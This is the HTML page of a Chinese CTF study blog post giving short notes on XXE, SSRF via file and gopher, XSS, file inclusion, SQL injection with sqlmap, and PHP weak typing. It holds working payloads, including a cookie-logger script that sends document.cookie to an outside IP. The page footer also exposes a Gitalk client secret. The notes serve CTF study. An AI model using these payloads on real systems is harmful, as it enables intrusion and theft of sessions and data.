@@ -1,0 +1,851 @@
+<!DOCTYPE html>
+
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+   
+  <meta name="keywords" content="CTF, Web,漏洞挖掘, 调试, 代码, 计算机科学, Kiprey, Blog, 二进制，信息安全" />
+   
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    CTF Web 的笔记 |  Kiprey&#39;s Blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+  
+  
+
+  
+<script>
+var _hmt = _hmt || [];
+(function() {
+	var hm = document.createElement("script");
+	hm.src = "https://hm.baidu.com/hm.js?acff2772e1f74a625e1e26c280afa6c2";
+	var s = document.getElementsByTagName("script")[0]; 
+	s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<link rel="alternate" href="/atom.xml" title="Kiprey's Blog" type="application/atom+xml">
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+      <canvas width="1777" height="841"
+        style="position: fixed; left: 0px; top: 0px; z-index: 99999; pointer-events: none;"></canvas>
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-CTF_web"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  CTF Web 的笔记
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2020/04/CTF_web/" class="article-date">
+  <time datetime="2020-04-15T16:00:00.000Z" itemprop="datePublished">2020-04-16</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">7 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>一点点曾经整理的Web笔记，篇幅会相对较小一点。</p>
+<h2 id="1-XXE-攻击-XML">1. XXE 攻击 (XML)</h2>
+<ol>
+<li>
+<p>示例</p>
+ <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>&gt;</span> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="symbol">&amp;xxe;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="2-SSRF">2. SSRF</h2>
+<h3 id="函数的注意点">函数的注意点</h3>
+<h4 id="1-cURL">1. cURL</h4>
+<h4 id="2-file-get-contents">2. file_get_contents</h4>
+<ul>
+<li>gopher 协议无法URLencode</li>
+<li>关于gopher的302跳转有bug，导致利用失败</li>
+</ul>
+<a id="more"></a>
+<h3 id="一个有趣的域名">一个有趣的域名</h3>
+<p><a href="http://xip.io" target="_blank" rel="noopener">xip.io</a> - 这个域名在bypass WAF时可能会有点作用<br>
+以下是简介</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">What is xip.io?</span><br><span class="line">xip.io is a magic domain name that provides wildcard DNS</span><br><span class="line">for any IP address. Say your LAN IP address is 10.0.0.1.</span><br><span class="line">Using xip.io,</span><br><span class="line"></span><br><span class="line">          10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">      www.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line">  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1</span><br><span class="line"></span><br><span class="line">...and so on. You can use these domains to access virtual</span><br><span class="line">hosts on your development web server from devices on your</span><br><span class="line">local network, like iPads, iPhones, and other computers.</span><br><span class="line">No configuration required!</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意：windows清除本地DNS缓存的命令为<br>
+ipconfig/flusdns<br>
+（别问我为什么要给出来，相信我，你一定会用上的 <strong>XD</strong>)</p>
+</blockquote>
+<h3 id="1-file协议">1. file协议</h3>
+<blockquote>
+<p>file://localhost/etc/passwd 能够读取到 /etc/passwd 的内容，同时这种情况会忽略 host</p>
+</blockquote>
+<h3 id="2-gopher协议">2. gopher协议</h3>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;&#123;host&#125;:&#123;port&#125;&#x2F;_&#123;body&#125;</span><br></pre></td></tr></table></figure>
+<p>使用方法：</p>
+<ol>
+<li>
+<p>首先构造 POST 的 payload</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>然后构造整个 HTTP 请求（ <strong>Content-Length不能少</strong> ）<br>
+注意:</p>
+<ul>
+<li>每个冒号后面都有一个空格</li>
+<li>http头和携带的请求数据之间间隔一个空行</li>
+<li>所有的换行都是 <strong>'\r\n’</strong></li>
+<li>分号一定要用 <code>%3B</code></li>
+<li>Content-Length 是 html报文中 body的长度（URL编码前） ， 不包括报头
+<ul>
+<li>Content-Length一定要设置正确，否则会返回http 400错误</li>
+</ul>
+</li>
+</ul>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;webshe11111111.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>加上协议的其他部分</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST &#x2F;webshe11111111.php HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">User-Agent: curl&#x2F;7.43.0</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Length: 34</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">admin&#x3D;h1admin&amp;hacker&#x3D;system(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>url 编码 （有些部分需要二次编码，例如<code>%0d %0a %20 分别编码为 %250d %250a %2520</code>）</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3A%2F%2F127.0.0.1%3A80%2F_POST%2520%2Fwebshe11231231231.php%2520HTTP%2F1.1%250D%250AHost%3A%2520127.0.0.1%250D%250AUser-Agent%3A%2520curl%2F7.43.0%250D%250AAccept%3A%2520*%2F*%250D%250AContent-Length%3A%252034%250D%250AContent-Type%3A%2520application%2Fx-www-form-urlencoded%250D%250A%250D%250Aadmin%3Dh1admin%26hacker%3Dsystem(%22ls%22)%3B</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>访问该地址得到目录下的文件</p>
+</li>
+</ol>
+<h2 id="3-xss攻击">3. xss攻击</h2>
+<ul>
+<li>
+<p>源码</p>
+  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>( $_GET[<span class="string">"code"</span>]))</span><br><span class="line">    $cookie = $_GET[<span class="string">"code"</span>];</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    $cookie = <span class="string">"no_cookies"</span>;</span><br><span class="line">$time = date(<span class="string">'Y-m-d g:i:s'</span>);</span><br><span class="line">$fp = fopen(<span class="string">"cookie.txt"</span>,<span class="string">"a"</span>);</span><br><span class="line">fwrite($fp, <span class="string">"Date: "</span>.$time.<span class="string">" Cookie:"</span>.$cookie.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Visited"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  &lt;script&gt;document.location="http://222.186.150.131:37992/index.php?code="+document.cookie;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>有趣的域名</p>
+<ul>
+<li>倘若自己没有独立的服务器， 或不能内网穿透，可以试试这个域名
+<ul>
+<li><a href="http://ceye.io" target="_blank" rel="noopener">ceye.io</a></li>
+</ul>
+</li>
+<li>这个网站会记录下发送到个人子域名的所有http流量，如此便可以得到返回的cookie</li>
+</ul>
+</li>
+</ul>
+<p>在console窗口中输入如下代码刷新页面即可设置新cookies</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.cookie="keyName=cookeiValue";</span><br></pre></td></tr></table></figure>
+<h2 id="4-⽂件包含-伪协议-base64-解码">4. ⽂件包含+伪协议 base64 解码</h2>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;test.com&#x2F;index.php?action&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</span><br></pre></td></tr></table></figure>
+<h2 id="5-SQL">5. SQL</h2>
+<ol>
+<li>
+<p>sql 注入</p>
+<blockquote>
+<p>注意点：<br>
+在地址栏输入<code>#</code>时，应尽量改写成<code>%23</code>，原因是<code>#</code>在地址栏中有特殊的含义<br>
+在地址栏输入空格<code> </code>时，应尽量改写成<code>%20</code>或<code>+</code></p>
+</blockquote>
+<ol>
+<li>
+<p>常用过WAF的套路</p>
+<ol>
+<li>
+<p>空格过滤</p>
+<ul>
+<li>用注释符<code>/**/</code></li>
+</ul>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1'<span class="comment">/*1*/</span>union<span class="comment">/*1*/</span><span class="keyword">select</span><span class="comment">/*1*/</span><span class="keyword">database</span>();<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+<li>
+<p>常用语句</p>
+<ol>
+<li>
+<p>判断当前表的列数</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">order by 列数 %23</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取当前数据库名</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">database</span>() %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取所有数据库名</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(SCHEMA_NAME) <span class="keyword">from</span> information_schema.SCHEMATA %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取指定数据库的表名</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取指定数据表的列名（字段名）</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="string">'数据库名'</span> <span class="keyword">and</span> table_name=<span class="string">'表名'</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>获取指定数据表指定字段的全部数据（使用<code>where</code>指定单一数据）</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union <span class="keyword">select</span> 字段名 <span class="keyword">from</span> 表名 %<span class="number">23</span></span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>修改指定数据表指定字段的数据（使用<code>where</code>指定单一数据）</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; <span class="keyword">UPDATE</span> 表名 <span class="keyword">set</span> 字段=内容 <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+</li>
+</ol>
+</li>
+<li>
+<p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">Sqli-labs</a></p>
+</li>
+<li>
+<p>sqlmap常用语法</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">检查注入点：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11</span><br><span class="line"></span><br><span class="line">爆所有数据库信息：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs</span><br><span class="line"></span><br><span class="line">爆当前数据库信息：</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --current-db</span><br><span class="line"></span><br><span class="line">指定库名列出所有表</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 --tables # &#39;vhost48330&#39; 为指定数据库名称</span><br><span class="line"></span><br><span class="line">指定库名表名列出所有字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 -T admin --columns# &#39;admin&#39; 为指定表名称</span><br><span class="line"></span><br><span class="line">指定库名表名字段dump出指定字段</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id＝11 -D vhost48330 -T admin -C ac，id，password --dump# &#39;ac,id,password&#39; 为指定字段名称</span><br><span class="line"></span><br><span class="line">各种过WAF的tamper脚本</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs --tamper&#x3D;&quot;space2plus.py,hex2char.py&quot;</span><br><span class="line"></span><br><span class="line">使用多线程</span><br><span class="line">sqlmap -u http:&#x2F;&#x2F;xxxx.com&#x2F;index.php?artist_id&#x3D;11 --dbs --thread&#x3D;10</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>其他</p>
+<ol>
+<li><strong>information_schema</strong> 数据库表说明:
+<ul>
+<li>SCHEMATA 表：提供了当前 mysql 实例中所有数据库的信息。<code>show databases</code> 的结果取之此表。</li>
+<li>TABLES 表：提供了关于数据库中的表的信息（包括视图）。详细表述了某个表属于哪个 schema，表类型，表引擎，创建时间等信息。<code>show tables from schemaname</code> 的结果取之此表。</li>
+<li>COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。<code>show columns from schemaname.tablename</code> 的结果取之此表。</li>
+</ul>
+</li>
+</ol>
+</li>
+<li>
+<p>常用 sql 语法</p>
+ <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNION 操作符用于合并两个或多个 <span class="keyword">SELECT</span> 语句的结果集。</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="6-php">6. php</h2>
+<ol>
+<li>
+<p>php 超全局变量</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$GLOBALS</span><br><span class="line">$_SERVER</span><br><span class="line">$_REQUEST</span><br><span class="line">$_POST</span><br><span class="line">$_GET</span><br><span class="line">$_FILES</span><br><span class="line">$_ENV</span><br><span class="line">$_COOKIE</span><br><span class="line">$_SESSION</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>md5 碰撞 =&gt; 利用 php 弱类型</p>
+</li>
+</ol>
+<ul>
+<li>0e 纯数字的字符串在判断相等的时候会被认为是科学计数法的数字，⽐较时⾸先会做字符串到数字的转换。</li>
+<li>转换后都成为了 0 的 n 次⽅，相等。</li>
+<li>md5 以 0e 开头的字符例子： <code>QNKCDZO</code> <code>240610708</code></li>
+</ul>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://kiprey.github.io/2020/04/CTF_web/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2020/04/heap-8-UAF/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            heap - 8 - UAF漏洞的简单介绍及其例子
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/04/crypto/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">CTF Crypto 的笔记</div>
+      </a>
+    
+  </nav>
+
+   
+ 
+   
+<div class="gitalk" id="gitalk-container"></div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
+
+
+<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/blueimp-md5@2.10.0/js/md5.min.js"></script>
+
+<script type="text/javascript">
+  var gitalk = new Gitalk({
+    clientID: '5f6c407f4cb8963d03ac',
+    clientSecret: '1d6faa663a735dbfd671990187d6e62b32498560',
+    repo: 'kiprey.github.io',
+    owner: 'kiprey',
+    admin: ['kiprey'],
+    // id: location.pathname,      // Ensure uniqueness and length less than 50
+    id: md5(location.pathname),
+    distractionFreeMode: false,  // Facebook-like distraction free mode
+    pagerDirection: 'last'
+  })
+
+  gitalk.render('gitalk-container')
+</script>
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2025
+        <i class="ri-heart-fill heart_icon"></i> Kiprey
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        <!-- <script src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
+        <script>
+            $(document).ready(function() {
+                var int1 = setInterval(fixCount1, 100);
+                var int2 = setInterval(fixCount2, 100);
+
+                var busuanziValueSiteOffset = 100000000000;
+                var busuanziValuePageOffset = 200000000000;
+                function fixCount1() {
+                    if ($("#busuanzi_value_site_uv").css("display") != "none") {
+                        clearInterval(int1);
+                        $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + busuanziValueSiteOffset);
+                    }
+                }
+                function fixCount2() {
+                    if ($("#busuanzi_value_page_pv").css("display") != "none") {
+                        clearInterval(int2);
+                        $("#busuanzi_value_page_pv").html(parseInt($("#busuanzi_value_page_pv").html()) + busuanziValuePageOffset);
+                    }
+                }
+            });
+        </script> -->
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Kiprey&#39;s Blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
